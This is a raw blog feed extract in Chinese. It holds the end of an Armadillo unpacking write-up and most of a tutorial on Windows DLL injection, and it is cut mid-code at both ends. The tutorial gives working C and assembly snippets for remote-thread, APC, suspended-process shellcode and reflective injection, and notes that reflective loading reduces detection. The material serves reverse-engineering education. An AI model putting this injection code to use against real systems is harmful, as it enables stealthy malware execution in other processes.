class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-26F0]        <span class="comment">; eax为IAT地址</span></div><div class="line">0218CF20    8B8D 68CAFFFF   <span class="keyword">mov</span>     <span class="built_in">ecx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">3598</span>]        <span class="comment">; ecx是加密的值</span></div><div class="line">0218CF26    <span class="number">8908</span>            <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>], <span class="built_in">ecx</span>             <span class="comment">; 将值写入IAT中</span></div><div class="line">0218CF28    8B85 10D9FFFF   <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-26F0]        <span class="comment">; 定位IAT</span></div><div class="line">0218CF2E    83C0 <span class="number">04</span>         <span class="keyword">add</span>     <span class="built_in">eax</span>, <span class="number">4</span>                           <span class="comment">; 指向下一个地址</span></div><div class="line">0218CF31    <span class="number">8985</span> 10D9FFFF   <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-26F0], <span class="built_in">eax</span>        <span class="comment">; 写入</span></div><div class="line">0218CF37  ^ E9 4DFCFFFF     <span class="keyword">jmp</span>     0218CB89                         <span class="comment">; 便利下一个</span></div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x0-前言&quot;&gt;&lt;a href=&quot;#0x0-前言&quot; class=&quot;headerlink&quot; title=&quot;0x0 前言&quot;&gt;&lt;/a&gt;0x0 前言&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;最近在跟进一个APT组织的一次攻击，其中有一个样本使用了Arm加壳，所以花了差不多10多天的时间看看这方面的东西。并总结一下。&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;这篇文章主要参考了FLY和刹那恍惚两位大佬的文章。和录制的视频。以及jcyhlh大侠在2008年写下的总结帖。那时候我估计还在玩泥巴呢。这是我写这篇文章的主要参考来源。前人栽树后人乘凉。此外还看了&lt;strong&gt;看雪的知识库&lt;/strong&gt;。基本看了3.x和4.x所有师傅的文章。&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;这篇文章的架构，文章架构主要参照了网上下载的视频教程的架构。并对此作出小小修改和注释以及归纳总结。更加方便我等小白学习成长。&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;由于文章主要脱去的是3.x和4.x的Arm，可能有一些&lt;strong&gt;伪大佬&lt;/strong&gt;又要说都发了几百遍了还在发。这篇文章适合我等小白，所以伪大佬勿扰。真大佬可以daidaiwo。&lt;strong&gt;对此我的处理意见是，把其直接挂在文章起始部分&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;最后，加油吧，小伙伴们。&lt;br&gt;
    
    </summary>
    
      <category term="windows安全" scheme="https://findream.github.io/categories/windows%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>一篇文章带你了解Dll注入</title>
    <link href="https://findream.github.io/2019/04/28/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E4%BA%86%E8%A7%A3Dll%E6%B3%A8%E5%85%A5/"/>
    <id>https://findream.github.io/2019/04/28/一篇文章带你了解Dll注入/</id>
    <published>2019-04-28T07:02:11.000Z</published>
    <updated>2021-03-27T09:45:22.106Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这是&lt;一篇文章带你…&gt;系列的第四篇，主要会阐明DLL注入的基本原理和几种主流方式，虽然这些方法已经有点滞后了。但是DLL注入的基本原理是不会改变的。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DLL注入的主要原理就是强制进程自己将需要注入的dll文件注入到自身进程空间内，最好配合Hook技术。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Dll注入可以从三个方向入手：第一：在进程创建初期按照导入表加载dll的时候。第二：进程运行时期利用LoadLibrary函数加载，第三：利用某些系统机制：例如windows消息机制等。<br><a id="more"></a></p><h1 id="进程创建后期"><a href="#进程创建后期" class="headerlink" title="进程创建后期"></a>进程创建后期</h1><h2 id="0x1-CreateRemoteThread"><a href="#0x1-CreateRemoteThread" class="headerlink" title="0x1 CreateRemoteThread"></a>0x1 CreateRemoteThread</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此方法是最常见的dll注入的方法，原理是由于CreateRemoteThread的函数原型和CreateThread是一致的。所以模仿CreateThread创建线程的方式实现注入。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于创建的是远程线程，是需要将注入的参数(也就是Dll文件的路径)写入目标进程空间。所以基本步骤如下：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;打开目标进程句柄<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//打开目标进程</span></div><div class="line">hProc = OpenProcess(PROCESS_ALL_ACCESS,</div><div class="line">FALSE,</div><div class="line">dwTargetPid</div><div class="line">);</div><div class="line"><span class="keyword">if</span> (hProc == <span class="literal">NULL</span>)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"OpenProcess:%d\n"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;向目标进程中开辟空间并写入Dll文件路径<br><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//向目标进程中写入句柄</span></div><div class="line">LPTSTR psLibFileRemote = <span class="literal">NULL</span>;</div><div class="line">psLibFileRemote = (LPTSTR)VirtualAllocEx(hProc, </div><div class="line"><span class="literal">NULL</span>, </div><div class="line">lstrlen(DllPath) + <span class="number">1</span>, </div><div class="line">MEM_COMMIT,</div><div class="line">PAGE_READWRITE);</div><div class="line"><span class="keyword">if</span> (psLibFileRemote == <span class="literal">NULL</span>)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"VirtualAllocEx:%d\n"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line"><span class="built_in">BOOL</span> bRet=WriteProcessMemory(hProc,</div><div class="line">psLibFileRemote,</div><div class="line">(LPCVOID)DllPath,</div><div class="line"><span class="comment">//(void *)DllPath</span></div><div class="line">lstrlen(DllPath) + <span class="number">1</span>,</div><div class="line"><span class="literal">NULL</span>);</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;获取LoadLibrary的地址<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">PTHREAD_START_ROUTINE pfnStartAddr = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(<span class="string">"Kernel32.dll"</span>),</div><div class="line"><span class="string">"LoadLibraryA"</span>);</div><div class="line"><span class="keyword">if</span> (pfnStartAddr == <span class="literal">NULL</span>)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"GetProcAddress %d\n"</span>,GetLastError());</div><div class="line"><span class="keyword">return</span> FALSE;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用CreateRemoteThread函数调用LoadLibrary加载dll<br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">//CreateThreadThread</div><div class="line">HANDLE hThread = CreateRemoteThread(hProc,</div><div class="line"><span class="built_in">NULL,</span></div><div class="line"><span class="built_in">0,</span></div><div class="line"><span class="built_in">pfnStartAddr,</span></div><div class="line"><span class="built_in">psLibFileRemote,</span></div><div class="line"><span class="built_in">0,</span></div><div class="line">NULL)<span class="comment">;</span></div></pre></td></tr></table></figure></p><h2 id="0x2-RtlCreateUserThread"><a href="#0x2-RtlCreateUserThread" class="headerlink" title="0x2 RtlCreateUserThread"></a>0x2 RtlCreateUserThread</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RtlCreateUserThread是CreateRemoteThread的底层实现，所以使用RtlCreateUserThread的原理是和使用CreateRemoteThread的原理是一样的。唯一的区别是使用CreateRemoteThread写入目标进程的是Dll的路径，而RtlCreateUserThread写入的是一段shellcode。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;和CreateRemoteThread一样都是需要获取目标进程句柄，获取LoadLibrary地址，dll路径。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着我们需要获取RtlCreateUserThread地址，RtlCreateUserThread函数原型如下：<br><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">typedef <span class="type">NTSTATUS</span>(__stdcall *<span class="type">PCreateThread</span>)(   </div><div class="line"><span class="type">HANDLE</span> <span class="type">Process</span>,                                 //句柄</div><div class="line"><span class="type">PSECURITY_DESCRIPTOR</span> <span class="type">ThreadSecurityDescriptor</span>,  //线程安全描述符              </div><div class="line"><span class="type">BOOLEAN</span> <span class="type">CreateSuspended</span>,                      //创建挂起标志</div><div class="line"><span class="type">ULONG</span> <span class="type">ZeroBits</span>,</div><div class="line"><span class="type">SIZE_T</span> <span class="type">MaximumStackSize</span>,</div><div class="line"><span class="type">SIZE_T</span> <span class="type">CommittedStackSize</span>,</div><div class="line"><span class="type">PUSER_THREAD_START_ROUTINE</span> <span class="type">StartAddress</span>,      //远程线程函数</div><div class="line"><span class="type">PVOID</span> <span class="type">Parameter</span> <span class="type">OPTIONAL</span>,                      //参数</div><div class="line"><span class="type">PHANDLE</span> <span class="type">Thread</span> <span class="type">OPTIONAL</span>,</div><div class="line"><span class="type">PCLIENT_ID</span> <span class="type">ClientId</span> <span class="type">OPTIONAL</span></div><div class="line">);</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如何构造shellcode？<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">VOID ShellCodeFun(VOID)</div><div class="line">&#123;</div><div class="line">_asm</div><div class="line">&#123;</div><div class="line"><span class="keyword">call</span> L001</div><div class="line"><span class="symbol">L001:</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">ebx</span></div><div class="line"><span class="keyword">sub</span> <span class="built_in">ebx</span>,<span class="number">5</span>                                                //自定位</div><div class="line"><span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span> : [<span class="built_in">ebx</span>]INJECT_DATA.lpParameter         //lpParameter</div><div class="line"><span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span> : [<span class="built_in">ebx</span>]INJECT_DATA.lpThreadStartRoutine //ThreadProc</div><div class="line"><span class="keyword">xor</span> <span class="built_in">ebx</span>,<span class="built_in">ebx</span></div><div class="line"><span class="keyword">push</span> <span class="built_in">ebx</span></div><div class="line"><span class="keyword">push</span> -<span class="number">2</span></div><div class="line"><span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span> : [<span class="built_in">ebx</span>]INJECT_DATA.AddrOfZwTerminateThread //ZwTerminateThread</div><div class="line"><span class="keyword">nop</span></div><div class="line"><span class="keyword">nop</span></div><div class="line"><span class="keyword">nop</span></div><div class="line"><span class="keyword">nop</span></div><div class="line"><span class="keyword">nop</span></div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将shellcode写入进程内存中，然后调用RtlCreateUserThread执行shellcode。<br><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//写入shellcode</span></div><div class="line"><span class="keyword">int</span> bRet = WriteProcessMemory(hProcess, pMem, &amp;Data, <span class="keyword">sizeof</span>(INJECT_DATA), &amp;dwIoCnt);</div><div class="line"><span class="keyword">if</span> (bRet == <span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">" WriteProcessMemory:%d\n"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line">status = RtlCreateUserThread(hProcess,    <span class="comment">//进程句柄</span></div><div class="line">lpThreadAttributes,                   <span class="comment">//线程安全符</span></div><div class="line"><span class="literal">TRUE</span>,                                 <span class="comment">//创建挂起标志</span></div><div class="line"><span class="number">0</span>,                                    <span class="comment">//ZeroBit</span></div><div class="line">dwStackSize,                          <span class="comment">//栈大小</span></div><div class="line"><span class="number">0</span>,</div><div class="line">(PUSER_THREAD_START_ROUTINE)pMem,    <span class="comment">//StartAddress，包含了shellcode和数据(StartAddress)</span></div><div class="line"><span class="literal">NULL</span>,                                <span class="comment">//参数</span></div><div class="line">&amp;hThread,                            <span class="comment">//远程线程句柄</span></div><div class="line">&amp;Cid                                 <span class="comment">//ClientID</span></div><div class="line">);</div></pre></td></tr></table></figure></p><h2 id="0x3-APC注入"><a href="#0x3-APC注入" class="headerlink" title="0x3 APC注入"></a>0x3 APC注入</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;APC中文名称为异步过程调用， APC是一个链状的数据结构，可以让一个线程在其本应该的执行步骤前执行其他代码，每个线程都维护这一个APC链。当线程从等待状态苏醒后，会自动检测自己得APC队列中是否存在APC过程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所以只需要将目标进程的线程的APC队列里面添加APC过程，当然为了提高命中率可以向进程的所有线程中添加APC过程。然后促使线程从休眠中恢复就可以实现APC注入。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先依旧是将DLL文件路径写入进程。<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">lpData = VirtualAllocEx(hProcess, lpData, lstrlen(szDllFullPath) + <span class="number">1</span>, MEM_COMMIT, PAGE_READWRITE)<span class="comment">;</span></div><div class="line">if (lpData)</div><div class="line">&#123;</div><div class="line"><span class="keyword">bStatus </span>= WriteProcessMemory(hProcess, lpData, szDllFullPath, lstrlen(szDllFullPath) + <span class="number">1</span>, &amp;stSize)<span class="comment">;</span></div><div class="line">if (FALSE == <span class="keyword">bStatus)</span></div><div class="line"><span class="keyword"></span>&#123;</div><div class="line">printf(<span class="string">"WriteProcessMemory:%d\n"</span>, GetLastError())<span class="comment">;</span></div><div class="line">return NULL<span class="comment">;</span></div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后使用QueueUserAPC将APC例程添加到APC队列中，QueueUserAPC三个参数分别是APC例程，线程句柄，例程参数。所以还需要获取线程句柄<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">dwRet=QueueUserAPC((PAPCFUNC)LoadLibraryA, hThread, (ULONG_PTR)lpData);</div><div class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == dwRet)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"QueueUserAPC:%d\n"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当然，为了提高命中率，可以使用遍历所有线程，然后利用te32.th32OwnerProcessID是否等于目标进程PID的策略进行进程全局注入。<br><figure class="highlight lasso"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (Thread32First(hThreadSnap, &amp;te32))</div><div class="line">&#123;</div><div class="line"><span class="keyword">do</span></div><div class="line">&#123;</div><div class="line"><span class="comment">//线程所属的进程ID==目标进程ID</span></div><div class="line"><span class="keyword">if</span> (te32.th32OwnerProcessID == dwPid)   </div><div class="line">&#123;</div><div class="line"><span class="comment">//获取当前线程句柄</span></div><div class="line"><span class="keyword">HANDLE</span> hThread = OpenThread(THREAD_ALL_ACCESS,<span class="literal">FALSE</span>,te32.th32ThreadID);</div><div class="line">DWORD dwRet = <span class="built_in">NULL</span>;</div><div class="line"><span class="comment">//插入APC队列</span></div><div class="line">dwRet=QueueUserAPC((PAPCFUNC)LoadLibraryA, hThread, (ULONG_PTR)lpData);</div><div class="line"><span class="keyword">if</span> (<span class="built_in">NULL</span> == dwRet)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"QueueUserAPC:%d\n"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="built_in">NULL</span>;</div><div class="line">&#125;</div><div class="line">CloseHandle(hThread);</div><div class="line">&#125;</div><div class="line">&#125; <span class="keyword">while</span> (Thread32Next(hThreadSnap, &amp;te32));</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="0x4-代码注入"><a href="#0x4-代码注入" class="headerlink" title="0x4 代码注入"></a>0x4 代码注入</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用傀儡进程：以挂起方式创建进程，然后向其中写入shellcode，利用shellcode执行LoadLibrary</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先以挂起方式创建进程，CreateProcess的第6个参数可以设定进程创建的方式<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="string">bRetProcess</span> <span class="string">=</span> <span class="string">CreateProcess("D:\\HostProc.exe",</span></div><div class="line"><span class="literal">NULL</span><span class="string">,</span></div><div class="line"><span class="literal">NULL</span><span class="string">,</span></div><div class="line"><span class="literal">NULL</span><span class="string">,</span></div><div class="line"><span class="literal">NULL</span><span class="string">,</span></div><div class="line"><span class="string">CREATE_SUSPENDED,</span>       <span class="string">//挂起创建进程</span></div><div class="line"><span class="literal">NULL</span><span class="string">,</span></div><div class="line"><span class="literal">NULL</span><span class="string">,</span></div><div class="line"><span class="string">&amp;Startup,</span></div><div class="line"><span class="string">&amp;pi);</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后需要保存进程的上下文信息，主要是EIP的值。以便于Load完成后返回。<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//获取CONTEXT</span></div><div class="line">ctx.ContextFlags = CONTEXT_CONTROL;</div><div class="line">GetThreadContext(pi.hThread, <span class="meta">&amp;ctx);</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着需要构建我们替换执行的代码。这段代码的目的是Load我们的恶意的dll文件，所以至少需要做两个方面的准备，第一：需要知道LoadLibrary的地址。第二需要知道Dll的路径。为了让程序更好的运行还需要保存现场。最后利用ret方式返回。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">unsigned char sc[] = &#123;</div><div class="line"><span class="comment">//push ret</span></div><div class="line"><span class="number">0x68</span>,retChar[<span class="number">0</span>],retChar[<span class="number">1</span>],retChar[<span class="number">2</span>],retChar[<span class="number">3</span>],</div><div class="line"><span class="comment">//push flags</span></div><div class="line"><span class="number">0x9C</span>,</div><div class="line"><span class="comment">//pushad</span></div><div class="line"><span class="number">0x60</span>,</div><div class="line"><span class="comment">//push DllPath</span></div><div class="line"><span class="number">0x68</span>, strChar[<span class="number">0</span>], strChar[<span class="number">1</span>],strChar[<span class="number">2</span>],strChar[<span class="number">3</span>],</div><div class="line"><span class="comment">//mov eax,AddressOfLoadLibrary</span></div><div class="line"><span class="number">0xB8</span>, apiChar[<span class="number">0</span>],apiChar[<span class="number">1</span>],apiChar[<span class="number">2</span>],apiChar[<span class="number">3</span>],</div><div class="line"><span class="comment">//call eax</span></div><div class="line"><span class="number">0xFF</span>,<span class="number">0xD0</span>,</div><div class="line"><span class="comment">//popad</span></div><div class="line"><span class="number">0x61</span>,</div><div class="line"><span class="comment">//popfd</span></div><div class="line"><span class="number">0x9D</span>,</div><div class="line"><span class="comment">//ret</span></div><div class="line"><span class="number">0xC3</span> &#125;;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;构造完这些之后将shellcode写入，由于内存本身就有执行属性，所以不需要修改内存属性。<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">bRet=WriteProcessMemory(pi.hProcess,</span></div><div class="line"><span class="keyword"></span>Remote_ShellCodePtr,</div><div class="line"><span class="keyword">ShellCode,</span></div><div class="line"><span class="keyword"></span><span class="keyword">ShellCodeLength,</span></div><div class="line"><span class="keyword"></span>NULL</div><div class="line">)<span class="comment">;</span></div><div class="line">if (FALSE == <span class="keyword">bRet)</span></div><div class="line"><span class="keyword">&#123;</span></div><div class="line"><span class="keyword"></span>printf(<span class="string">"WriteProcessMemory:%d\n"</span>, GetLastError())<span class="comment">;</span></div><div class="line">return FALSE<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后利用SetThreadContext将我们的EIP设置为shellcode起始地址。并调用ResumeThread重启线程<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ctx.<span class="keyword">Eip </span>=(DWORD) Remote_ShellCodePtr<span class="comment">;</span></div><div class="line">ctx.ContextFlags = CONTEXT_CONTROL<span class="comment">;</span></div><div class="line">SetThreadContext(pi.hThread, &amp;ctx)<span class="comment">;</span></div><div class="line">ResumeThread(pi.hThread)<span class="comment">;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了提高命中率可以向目标进程的所有线程进行注入.利用<code>CreateToolhelp32Snapshot</code>等三个函数遍历线程。<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (Thread32First(hThreadSnap, &amp;te32))</div><div class="line">&#123;</div><div class="line"><span class="keyword">do</span></div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (te32.th32OwnerProcessID == ProcessId)</div><div class="line">&#123;</div><div class="line">bStatus = TRUE;</div><div class="line">dwTidList[Index] = te32.th32ThreadID;</div><div class="line">//<span class="keyword">printf</span>(<span class="string">"%d:%d:%d\n"</span>, Index, dwTidList[Index], te32.th32ThreadID);</div><div class="line">Index++;</div><div class="line">&#125;</div><div class="line">&#125; <span class="keyword">while</span> (Thread32Next(hThreadSnap, &amp;te32));</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="0x5-反射式DLL注入"><a href="#0x5-反射式DLL注入" class="headerlink" title="0x5 反射式DLL注入"></a>0x5 反射式DLL注入</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;反射式dll注入不需要dll文件落地，减少被查杀的风险。首先将需要注入的dll写入进程内存，然后为该dll添加一个导出函数，利用这个导出函数让其自动的装载dll。注射器是将DLL文件写入目标进程内存。反射装载器实现的就是模拟dll装载器装载dll文件的操作。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先说一下注射器，注射器的目的是将Dll文件写入到目标进程空间，然后获取里面导出函数ReflectiveLoader。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先需要打开目标进程句柄<br><figure class="highlight lasso"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//打开目标进程句柄</span></div><div class="line"><span class="keyword">HANDLE</span> hProcess = <span class="built_in">NULL</span>;</div><div class="line">DWORD dwProcessId = <span class="number">0</span>;</div><div class="line">dwProcessId = GetProcessIdByName(ProcessNmae);</div><div class="line">hProcess = OpenProcess(PROCESS_CREATE_THREAD |   